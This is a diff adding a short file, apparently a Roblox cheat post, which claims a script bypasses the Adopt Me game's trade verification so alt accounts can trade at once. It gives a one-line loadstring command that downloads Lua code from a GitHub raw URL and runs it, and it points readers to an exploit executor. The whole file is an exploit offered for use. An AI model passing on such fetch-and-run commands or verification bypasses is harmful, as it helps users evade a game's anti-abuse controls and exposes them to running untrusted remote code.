@@ -1,0 +1,6 @@
+you need to verify on adopt me to trade, but using this script, you can bypass that and should be able to trad eon alts instantly
+
+loadstring(game:HttpGet'https://raw.githubusercontent.com/Sowd0404/Quick-Scripts/master/AdoptMeVerify.lua')()
+
+
+Note use krnl.ca if you dont have a exploit already!
